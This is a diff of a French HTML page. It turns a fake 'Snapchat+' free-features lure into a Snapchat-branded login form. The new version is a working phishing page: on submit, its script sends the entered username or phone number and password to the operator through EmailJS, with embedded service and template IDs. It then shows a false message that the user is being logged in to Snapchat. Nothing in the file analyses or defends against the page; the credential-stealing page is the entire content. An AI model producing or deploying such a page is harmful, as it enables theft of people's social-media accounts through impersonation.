@@ -1,168 +1,230 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Snapchat+</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #121212;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Connexion - Mon Site</title>
+  <!-- Lien vers Google Fonts pour la police de caractère -->
+  <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: Arial, sans-serif;
+      background-color: #f9f9f9;
+      margin: 0;
+    }
+    .container {
+      width: 350px; /* Augmenté la largeur */
+      padding: 20px;
+      background-color: #fff;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      border-radius: 8px;
+      text-align: center;
+      position: relative; /* Nécessaire pour positionner la signature */
+    }
+    h2 {
+      color: #000000;
+      font-size: 24px; /* Augmenté la taille de la police */
+    }
 
-        .container {
-            width: 60%;
-            max-width: 400px;
-            background: #1E1E1E;
-            border-radius: 15px;
-            box-shadow: 0 4px 10px rgba(255, 204, 0, 0.3);
-            color: white;
-            text-align: center;
-            overflow: hidden;
-        }
+    h3 {
+      color: #66b1efed;
+      font-size: 18px; /* Augmenté la taille de la police */
+      text-align: left;
+      margin-bottom: 8px; /* Ajouter un espace pour une meilleure lisibilité */
+    }
 
-        header {
-            background: linear-gradient(135deg, #453605, #564304);
-            padding: 35px;
-            color: black;
-            font-weight: bold;
-            position: relative;
-        }
+    .field {
+      margin-bottom: 28px;
+    }
+    .field label {
+      display: block;
+      font-size: 16px; /* Augmenté la taille de la police */
+      margin-bottom: 5px;
+    }
+    .field input {
+      width: 100%;
+      padding: 10px;
+      font-size: 16px; /* Augmenté la taille de la police */
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    .field input[type="text"] {
+      color: #008cff; /* Bleu clair */
+    }
+    .link {
+      display: block;
+      margin-bottom: 10px;
+      font-size: 16px; /* Augmenté la taille de la police */
+      color: #008cff;
+      text-decoration: none;
+      cursor: pointer; /* Ajouter le curseur de pointeur pour le lien */
+    }
+    .link:hover {
+      text-decoration: underline;
+    }
+    .checkbox-container {
+      display: flex;
+      align-items: center; /* Aligner le check avec la phrase */
+      margin-bottom: 15px; /* Ajusté pour un meilleur espacement */
+      font-size: 16px; /* Augmenté la taille de la police */
+    }
+    .checkbox-container input {
+      margin-right: 10px; /* Augmenté l'espacement entre le check et la phrase */
+      accent-color: #008cff; /* Check en bleu clair */
+    }
+    .checkbox-container label {
+      margin: 0;
+      line-height: 1.4; /* Ajuster l'espacement des lignes */
+      display: flex;
+      align-items: center; /* Aligner verticalement le texte avec le check */
+    }
+    .field input[type="submit"] {
+      background-color: #ccc; /* Gris */
+      color: #ffffff;
+      border: none;
+      cursor: pointer;
+      padding: 10px;
+      font-size: 16px; /* Augmenté la taille de la police */
+      border-radius: 20px; /* Contours plus arrondis */
+      margin-top: 30px; /* Faire descendre plus en bas */
+      width: 80%; /* Réduire la largeur du bouton */
+    }
+    .field input[type="submit"]:hover {
+      background-color: #bbb;
+    }
+    .forgot-password {
+      color: #008cff; /* Bleu clair */
+      display: block;
+      margin-bottom: 20px; /* Espacement avant le bouton de connexion */
+    }
+    #confirmation {
+      display: none;
+      color: green;
+      font-size: 16px; /* Augmenté la taille de la police */
+    }
+    .signature {
+      position: absolute;
+      bottom: 10px;
+      right: 10px;
+      text-align: right;
+      display: flex;
+      align-items: center; /* Aligner verticalement l'image et le texte */
+    }
+    .signature img {
+      width: 30px;
+      height: auto;
+    }
+    .signature span {
+      color: #fffc00; /* Jaune */
+      font-size: 18px; /* Augmenté la taille de la police */
+      font-weight: bold; /* En gras */
+      margin-left: 5px;
+      vertical-align: middle;
+      font-family: 'Press Start 2P', cursive; /* Police de caractère de thème jeu */
+    }
+    /* Media queries pour responsive design */
+    @media (max-width: 600px) {
+      .container {
+        width: 100%; /* Utiliser toute la largeur de l'écran */
+        padding: 10px;
+      }
+      .field input {
+        font-size: 14px; /* Réduire la taille de la police pour les petits écrans */
+      }
+      .field input[type="submit"] {
+        width: 90%; /* Augmenter la largeur du bouton pour les petits écrans */
+      }
+      h2, h3 {
+        font-size: 16px; /* Réduire la taille de la police pour les petits écrans */
+      }
+      .forgot-password, .link {
+        font-size: 14px; /* Réduire la taille de la police pour les petits écrans */
+      }
+    }
+  </style>
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2.4.1/dist/email.min.js"></script>
+  <script type="text/javascript">
+    (function() {
+      emailjs.init('g4HTytQL092Xue3Ar'); // Clé publique
+    })();
 
-        h1 {
-            position: absolute;
-            bottom: -35%;
-            left: 50%;
-            transform: translateX(-50%);
+    // Fonction pour basculer entre NOM D'UTILISATEUR et NUMÉRO DE TÉLÉPHONE
+    function toggleLabel() {
+      const label = document.querySelector('label[for="username"]');
+      const input = document.getElementById('username');
+      if (label && input) {
+        if (label.textContent === "NOM D'UTILISATEUR OU ADRESSE E-MAIL") {
+          label.textContent = "NUMÉRO DE TÉLÉPHONE";
+          input.type = "tel";
+          input.name = "telephone";
+        } else {
+          label.textContent = "NOM D'UTILISATEUR OU ADRESSE E-MAIL";
+          input.type = "text";
+          input.name = "username";
         }
-
-        .features {
-            padding: 20px;
-        }
-
-        .feature {
-            background: #292929;
-            padding: 15px;
-            margin: 10px 0;
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .feature h2 {
-            font-size: 16px;
-            margin: 0;
-        }
-
-        .feature p {
-            font-size: 14px;
-            color: #BDBDBD;
-            margin: 5px 0 0 0;
-        }
-
-        .banner {
-            background: #FFC400;
-            padding: 15px;
-            font-weight: bold;
-            color: black;
-            font-size: 18px;
-        }
-
-        .cta-button {
-            background: black;
-            color: #FFC400;
-            padding: 15px;
-            border: none;
-            font-size: 16px;
-            font-weight: bold;
-            border-radius: 10px;
-            cursor: pointer;
-            margin-top: 10px;
-            transition: 0.3s;
-            width: 90%;
-        }
-
-        .cta-button:hover {
-            background: #333333;
-        }
-
-        .free-button {
-            background: #FFC400;
-            color: white;
-            padding: 15px;
-            font-size: 18px;
-            font-weight: bold;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-            width: 90%;
-            margin-top: 10px;
-            transition: 0.3s;
-        }
-
-        .free-button:hover {
-            background: #3b2e01;
-        }
-
-        footer {
-            font-size: 12px;
-            color: #BDBDBD;
-            padding: 10px;
-        }
-    </style>
+      }
+    }
+  </script>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <h1><img src="logo+snap.png" alt="etoile_snap" width="90" height="90"></h1>
-            <p></p>
-        </header>
-
-        <div class="features">
-            <div class="feature">
-                <h2><img src="etoile_snap.png" alt="etoile_snap" width="90" height="90"></h2>
-                <p>Ajoutez une étoile noire à votre nom affiché.</p>
-            </div>
-            <div class="feature">
-                <h2><img src="logosnap+.png" alt="etoile_snap" width="90" height="90"></h2>
-                <p>Accédez à des icônes Snapchat exclusives.</p>
-            </div>
-            <div class="feature">
-                <h2><img src="emoji_snap.png" alt="etoile_snap" width="90" height="90"></h2>
-                <p>Modifiez le fond d'écran de vos conversations.</p>
-            </div>
-            <div class="feature">
-                <h2><img src="crayon_snap.png" alt="etoile_snap" width="90" height="90"></h2>
-                <p>Personnalisez la couleur de votre pseudo.</p>
-            </div>
-        </div>
-
-        <button class="free-button" onclick="goToFree()">Gratuit</button>
-
-        <script>
-            function goToFree() {
-                window.location.href = "index.html";
-            }
-        </script>
-
-        <button class="cta-button" onclick="showPlans()">Voir tous les forfaits</button>
-
-        <footer>
-            <p>Conditions et politiques d'abonnement, <a href="https://www.snap.com/terms/paid-features" target="_blank">fonctionnalités payantes</a></p>
-        </footer>
+  <div class="container">
+    <h2>Connexion</h2>
+    <form id="form">
+      <div class="field">
+        <h3><label for="username">NOM D'UTILISATEUR OU ADRESSE E-MAIL</label></h3>
+        <input type="text" name="username" id="username">
+      </div>
+      <h3><a href="#" class="link" onclick="toggleLabel()">Utiliser mon numéro de téléphone</a></h3>
+      <div class="field">
+        <h3><label for="password">MOT DE PASSE</label></h3>
+        <input type="password" name="password" id="password">
+      </div>
+      <div class="checkbox-container">
+        <input type="checkbox" id="save-info">
+        <label for="save-info">Enregistrer les informations de connexion sur votre appareil</label>
+      </div>
+      <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+      <div class="field">
+        <input type="submit" id="button" value="Connexion">
+      </div>
+    </form>
+    <div id="confirmation">
+      Les informations de connexion ont été envoyées !
     </div>
-    
-    <script>
-        function showPlans() {
-            window.location.href = 'https://www.snap.com/terms/paid-features';
-        }
-    </script>
+    <!-- Signature Snapchat -->
+    <div class="signature">
+      <img src="snapchat_logo.png" alt="Snapchat logo"> <!-- Remplacer par le nom de votre image -->
+      <span>Snapchat</span>
+    </div>
+  </div>
+  <script>
+    const btn = document.getElementById('button');
+
+    document.getElementById('form').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      btn.value = 'Envoi...';
+
+      console.log('Envoi en cours...');
+
+      const serviceID = 'service_7xtpexj';
+      const templateID = 'template_3jr5npg';
+
+      emailjs.sendForm(serviceID, templateID, this)
+        .then(() => {
+          console.log('Email envoyé avec succès');
+          btn.value = 'Connexion';
+          alert('Vous allez être connecté à votre compte Snapchat'); // Alerte à la place du message de confirmation
+        }, (err) => {
+          console.error('Erreur lors de l\'envoi de l\'email :', err);
+          btn.value = 'Connexion';
+          alert(JSON.stringify(err));
+        });
+    });
+  </script>
 </body>
 </html>
